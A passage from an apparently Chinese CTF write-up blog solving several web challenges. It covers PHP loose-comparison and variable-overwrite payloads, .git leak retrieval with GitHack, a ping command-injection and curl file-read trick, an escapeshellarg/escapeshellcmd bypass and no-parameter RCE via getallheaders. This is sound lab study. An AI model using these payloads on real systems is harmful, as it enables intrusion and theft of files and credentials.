class="hljs-string">&#x27;money&#x27;</span>=&gt;<span class="hljs-variable">$money</span>, <span class="hljs-string">&#x27;prize&#x27;</span>=&gt;<span class="hljs-variable">$prize</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP的弱相等(&#x3D;&#x3D;)和强相等(&#x3D;&#x3D;&#x3D;)碰见挺多次了，弱相等会在比较之前进行类型转换，转换完了再比较是否相等(可以用布尔、科学计数法等绕过)。强相等会直接比较类型是否相等？内容是否相等?(不过依然可以通过数组方法绕过)。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">下面的总结参考了这位师傅的文章:https://blog.csdn.net/qq_43715020?<span class="hljs-keyword">type</span>=blog <br><br>在php中,如果<span class="hljs-type">bool</span>和&quot;任何其他类型&quot;比较,&quot;任何其他类型&quot;会转换为<span class="hljs-type">bool</span>。<br>在PHP中当转换为 <span class="hljs-type">boolean</span> 时，以下值被认为是 <span class="hljs-keyword">FALSE</span> ：<br>(<span class="hljs-number">1</span>) 布尔值 <span class="hljs-keyword">FALSE</span> 本身<br>(<span class="hljs-number">2</span>) 整型值 <span class="hljs-number">0</span>（零）<br>(<span class="hljs-number">3</span>)浮点型值 <span class="hljs-number">0.0</span>（零）<br>(<span class="hljs-number">4</span>)空字符串，以及字符串 “<span class="hljs-number">0</span>”<br>(<span class="hljs-number">5</span>)不包括任何元素的数组(注意,一旦包含元素,就算包含的元素只是一个空数组,也是<span class="hljs-keyword">true</span>)<br>(<span class="hljs-number">6</span>)不包括任何成员变量的对象（仅 PHP <span class="hljs-number">4.0</span> 适用）<br>(<span class="hljs-number">7</span>)特殊类型 <span class="hljs-keyword">NULL</span>（包括尚未赋值的变量）<br>(<span class="hljs-number">8</span>)从空标记生成的 SimpleXML 对象<br>(<span class="hljs-number">9</span>)所有其它值包括<span class="hljs-number">-1</span>都被认为是 <span class="hljs-keyword">TRUE</span> <br></code></pre></td></tr></table></figure><p>因为是拿数组元素一个一个的比较，那就直接让<code>&quot;numbers&quot;</code>为[true,true,true,true,true,true,true]。</p><p>payload:<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]&#125;</code></p><p><img src="/img/lo4.png" alt="lo4"></p><p>不过有个问题我还没搞懂：bool的true和false常量是不区分大小写的，但我改成：<code>&#123;&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[TRUE,TRUE,TRUE,TRUE,TRUE,TRUE,TRUE]&#125;</code>就给我回显invalid json。。。难道json这东西的一些定义还对大小写有说法？</p><h3 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h3><p>题目描述: 抓住那只猫</p><p><img src="/img/cat1.png" alt="cat1"></p><p>随便输了个loli.club没啥反应，单上面的URL变化了：</p><p><code>/index.php?url=loli.club</code></p><p>GET传参url?看着像存在文件包含漏洞：</p><p>url&#x3D;etc&#x2F;passwd试了半天没啥反应。。用burpsuite抓包看response有个CAT？输个CAT尝试一下：</p><p><img src="/img/cat2.png" alt="cat2"></p><p>执行了ping命令？试试127.0.0.1：</p><p><img src="/img/cat3.png" alt="cat3"></p><p>果然是ping命令，那这题可能是RCE，但&amp;|;均被过滤掉了(提示invalid URL)。。后面不会做了，下面部分内容参考了这位师傅的博客，感谢：<code>https://blog.csdn.net/qq_44065556/article/details/120541298和https://www.cnblogs.com/xyongsec/p/11364520.html</code></p><p>既然有过滤就要看看它过滤了啥没过滤了啥，在框里输入东西后上面的URL会变化：</p><p><code>http://61.147.171.105:53337/index.php?url=127.0.0.1%26ls</code></p><p>直接送到burpsuite里爆破，集束炸弹模式从<code>%00</code>爆到<code>%FF</code>，发现当URL大于%80后会有报错：</p><p><img src="/img/cat4.png" alt="cat4"></p><p><img src="/img/cat5.png" alt="cat5"></p><p>发现有<html>，<head>等标签猜测要改成html后缀？改完后打开：</p><p><img src="/img/cat6.png" alt="cat6"></p><p>这玩意儿是个<code>Django</code>报错界面(感觉有点像今年NSCTF那道题的报错界面)：</p><p><code>illegal multibyte sequence 意思是非法的多字节序列</code></p><p>而GBK这东西面对超过0x7F的时候会用两个字符表示。感觉就是这里出了问题：超过%7F的URL均会把报错。</p><p>而且当 <code>CURLOPT_SAFE_UPLOAD</code> 为 true 时，如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求，来读取文件。</p><p><img src="/img/cat7.png" alt="cat7"></p><p>接下来有两种方法：一种先找settings.py在找database，另一种直接在报错页面ctrl+f找database:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>api/database.sqlite3<br></code></pre></td></tr></table></figure><p>django项目生成时settings.py会存放在项目目录下再以项目名称命名的文件夹下面:</p><p><code>/opt/api/api/settings.py</code></p><p>进数据库里直接ctrl+F然后找CTF就好了。。不过我做这道题的时候不知道咋回事没法读，一直进的是那页报错信息。。。MD</p><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>进环境发现是个网页：</p><p><img src="/img/a4.png" alt="a4"></p><p>感觉像是敏感文件泄露的题？先试试&#x2F;.git再用dirsearch扫：</p><p><img src="/img/a5.png" alt="a5"></p><p>有东西，直接上Githack：</p><p><code>python GitHack.py http://af058f36-8fc4-47ff-86be-d9b094d1187b.node4.buuoj.cn/.git/</code></p><p>发现有<code>index.php</code>和<code>flag.php</code>：</p><p><img src="/img/a6.png" alt="a6"></p><p>这里碰了钉子：有时候Githack不知道是扫太快了还是咋回事，无法下载扫出来的文件(比如一开始我就找不到下载的flag.php和index.php)。后来在网上找了半天，大佬说是线程太多的原因，把线程改小就可以不被拒绝访问，方法：</p><p><img src="/img/a7.png" alt="a7"></p><p>这东西本来是10，给改成1就好了。</p><p>(我感觉是我用windows的原因。。？因为之前dirsearch也出现过这种情况，用Linux就正常了)</p><p><img src="/img/a8.png" alt="a8"></p><p>看看他俩有啥东西：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs PHP">index.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><br><span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<br><span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<br><span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  POST传x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$y</span>;  <span class="hljs-comment">//变量覆盖,变量(x的值)=y</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123; GET传x=y<br>    <span class="hljs-variable">$$x</span> = <span class="hljs-variable">$$y</span>; <span class="hljs-comment">//同上，变量(x的值)=变量(y的值)</span><br>&#125;<br><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;  <span class="hljs-comment">//遍历GET传的</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);  <span class="hljs-comment">//终止脚本执行并返回$handsome</span><br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;<span class="hljs-comment">//GET、POST均没传flag</span><br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);  <span class="hljs-comment">//终止脚本执行并返回$yds</span><br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>); <span class="hljs-comment">//终止脚本执行并返回$is</span><br>&#125;<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;<br><br>flag.php:<br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$flag</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br></code></pre></td></tr></table></figure><p>$flag已经定义，要想办法把$flag搞出来。但通篇只有利用exit去显示$yds、$is、$handsome，和变量覆盖联系一下：是否可以利用变量覆盖直接exit($flag)？</p><p>第二个flag在我看来最好满足：只要GETPOST都不传flag就行了，但是如何exit($flag)？</p><p><code>$yds=$flag</code>  $(x的值)&#x3D;$(y的值)-&gt;GET传<code>yds=flag</code></p><p>payload：<code>/index.php?yds=flag</code></p><h2 id="BUUCTF-2018-Online-Tool-还没做完标记一下"><a href="#BUUCTF-2018-Online-Tool-还没做完标记一下" class="headerlink" title="[BUUCTF 2018]Online Tool 还没做完标记一下"></a>[BUUCTF 2018]Online Tool 还没做完标记一下</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$host</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;host&#x27;</span>];<br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellarg</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.确保用户只传递一个参数给命令。2用户不能指定更多的参数。3.用户不能执行不同的命令。</span><br>    <span class="hljs-variable">$host</span> = <span class="hljs-title function_ invoke__">escapeshellcmd</span>(<span class="hljs-variable">$host</span>);<span class="hljs-comment">//1.确保用户只执行一个命令。2.用户可以指定不限数量的参数。3.用户不能执行不同的命令。 这两个函数一起使用会存在漏洞。</span><br>    <span class="hljs-variable">$sandbox</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&quot;glzjin&quot;</span>. <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;you are in sandbox &#x27;</span>.<span class="hljs-variable">$sandbox</span>;<br>    @<span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-variable">$sandbox</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.<span class="hljs-variable">$host</span>);<br>&#125;    <span class="hljs-comment">//-T5 : 可以加快或者减慢扫描速度，有六个级别，级别越高速度越快，也越容易被WAF或者IDS发现。-sT：使用TCP Syn扫描最常用的端口，会完整的执行完TCP的三次握手，隐蔽性不强。-Pn：有时候防火墙会禁止ping请求.-PN命令告诉Nmap不用ping远程主机。–host-timeout ：限制每个 IP 地址的扫描时间(单位为秒).-F：要求扫描时(包挺ping扫描)使用小的IP包分段。</span><br></code></pre></td></tr></table></figure><p>看了其它师傅们的wp，问题主要出在连续使用<code>escapeshellarg</code> 和 <code>escapeshellcmd</code>上：同时使用会导致绕过过滤执行命令：</p><p>以下内容参考了X1r0z师傅的博客：</p><p><code>https://exp10it.cn/2022/08/buuctf-web-writeup-3/#buuctf-2018online-tool</code></p><blockquote><p>escapeshellarg() 会在单引号之前加上 <code>\</code>, 并在被转义的单引号两边和整个字符串两边加上单引号</p><p>escapeshellcmd() 会在所有的 <code>\</code> 前加上 <code>\</code>, 形成 <code>\\</code>, 并在<strong>不成对</strong>的单引号前加 <code>\</code></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">123</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> -&gt; <span class="hljs-string">&#x27;123&#x27;</span> <span class="hljs-comment"># 正常效果</span><br>    <br><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;\&#x27; # 最后一个引号不成对, 被转义</span><br><span class="hljs-string"></span><br><span class="hljs-string">123&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # 所有引号成对, 不转义</span><br><span class="hljs-string"></span><br><span class="hljs-string">&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;\&#x27;&#x27;</span><span class="hljs-string">&#x27; -&gt; &#x27;</span><span class="hljs-string">&#x27;\\&#x27;</span><span class="hljs-string">&#x27;123&#x27;</span>\\<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27; # 所有引号成对, 不转义</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_43952190/article/details/<span class="hljs-number">105846175</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/shinygod/article/details/<span class="hljs-number">123207785</span>?utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>~default~baidujs_baidulandingword~default-<span class="hljs-number">0</span>-<span class="hljs-number">123207785</span>-blog-<span class="hljs-number">105846175</span>.<span class="hljs-number">235</span>^v38^pc_relevant_yljh&amp;spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4242</span>.<span class="hljs-number">1</span>&amp;utm_relevant_index=<span class="hljs-number">3</span><br><br><span class="hljs-attribute">https</span>://exp10it.cn/<span class="hljs-number">2022</span>/<span class="hljs-number">08</span>/buuctf-web-writeup-<span class="hljs-number">3</span>/#buuctf-<span class="hljs-number">2018</span>online-tool<br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/weixin_44077544/article/details/<span class="hljs-number">102835099</span><br><br><span class="hljs-attribute">https</span>://blog.csdn.net/xhy18634297976/article/details/<span class="hljs-number">122852540</span>?spm=<span class="hljs-number">1001</span>.<span class="hljs-number">2101</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">6650</span>.<span class="hljs-number">1</span>&amp;utm_medium=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-<span class="hljs-number">2</span>%<span class="hljs-number">7</span>Edefault%<span class="hljs-number">7</span>ECTRLIST%<span class="hljs-number">7</span>ERate-<span class="hljs-number">1</span>-<span class="hljs-number">122852540</span>-blog-<span class="hljs-number">100711933</span>.<span class="hljs-number">235</span>%<span class="hljs-number">5</span>Ev38%<span class="hljs-number">5</span>Epc_relevant_yljh&amp;utm_relevant_index=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p><img src="/img/tw1.png" alt="tw1"></p><p>源码没啥信息，直接dirsearch扫看看吧：</p><p><code>python dirsearch.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn --delay 3 -t 30</code></p><p><img src="/img/tw2.png" alt="tw2"></p><p>扫出来很多.git文件。。应该是git泄露了，用GitHack弄它：</p><p><code>python GitHack.py -u http://8126df41-22c6-4533-823d-8e6fc9622f9d.node4.buuoj.cn/.git/</code></p><p><img src="/img/tw3.png" alt="tw3"></p><p>现在windows下看看，不行再用Kali做。发现有个Index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//正则匹配，过滤了点伪协议要用的东西(比如data://啥的，前面加那个\是转义用的)，没触发则进行下一步判断。/i模式不区分大小写</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//匹配a-z，逗号和_，\(和\)分别是转义后的左括号和右括号。(?R)?这玩意儿查了一下说是递归模式?正则过滤后的结果必须强等于分号</span><br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>])) &#123;<span class="hljs-comment">//又一次过滤了一大堆东西                // echo $_GET[&#x27;exp&#x27;];</span><br>                @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;exp&#x27;</span>]);<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还差一点哦！&quot;</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;再好好想想！&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;还想读flag，臭弟弟！&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">// highlight_file(__FILE__);</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs PHP">正则匹配中(?R)?递归模式的解释：<br>    ?R是引用当前表达式((/[a-z,_]+((?R)?)/))，形成递归调用。<br>    ?表示递归当前表达式<span class="hljs-number">0</span>次或<span class="hljs-number">1</span>次。若是(?R)*则表示递归当前表达式<span class="hljs-number">0</span>次或多次，例如它可以匹配<span class="hljs-title function_ invoke__">a</span>(<span class="hljs-title function_ invoke__">b</span>(<span class="hljs-title function_ invoke__">c</span>()<span class="hljs-title function_ invoke__">d</span>()))，举个栗子：<br>    <br>    <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span>   <span class="hljs-comment">//echo  hello</span><br> <br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;a(b(c(d()f()e())));&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[a-z,_]+\((?R)*\)/&#x27;</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-variable">$a</span>)) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;goodbye&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hello&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><span class="hljs-comment">//echo  goodbye</span><br><br><span class="hljs-comment">//注意$a的格式，如果是很标准的一个括号套着一个括号：a(b(c()))，ok,用这两种都没问题，但你如果有的地方套了两个：a(b()c())。那第一种就不行了，只能用第二种。我个人理解就是?一个套着一个这样搞，但是*允许一个套多个。感觉这就是题目说的套娃？一般RCE都要给执行命令的函数传参，比如eval(system(&#x27;ls&#x27;));。匹配完了会多个&#x27;&#x27;出来。</span><br>    <br></code></pre></td></tr></table></figure><p>经过这种正则匹配后能过滤的基本都过滤了，去网上查了wp原来这是一种叫<code>无参数RCE</code>的题型(第一次见)。下面的内容参考了这两位师傅的文章，感谢!</p><p><code>https://blog.csdn.net/Manuffer/article/details/120738755</code></p><p><code>https://blog.csdn.net/weixin_46330722</code></p><p>无参数RCE一般有三种解法：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-number">1</span>.利用<span class="hljs-built_in">getallheaders</span>()函数。<br><span class="hljs-number">2</span>.利用<span class="hljs-built_in">get_defined_vars</span>()函数。<br><span class="hljs-number">3</span>.利用session_id帮助命令执行。<br></code></pre></td></tr></table></figure><p>拿<code>getallheaders()</code>来说，这东西会以数组形式返回所有HTTP头信息，举个栗子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">getallheaders</span>());<span class="hljs-comment">//数组形式所以我用了var_dump</span><br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/tw4.png" alt="tw4"></p><p>可以看到以数组的形式返回了HTTP数据包的头和对应信息，有意思的一点是这东西是倒着出来的。</p><p>数组形式肯定没法用，想给<code>eval</code>啥的传参肯定要是个字符串。可以利用<code>implode</code>函数把数组变成字符串，看下GPT对这个函数的解释：</p><p><img src="/img/tw5.png" 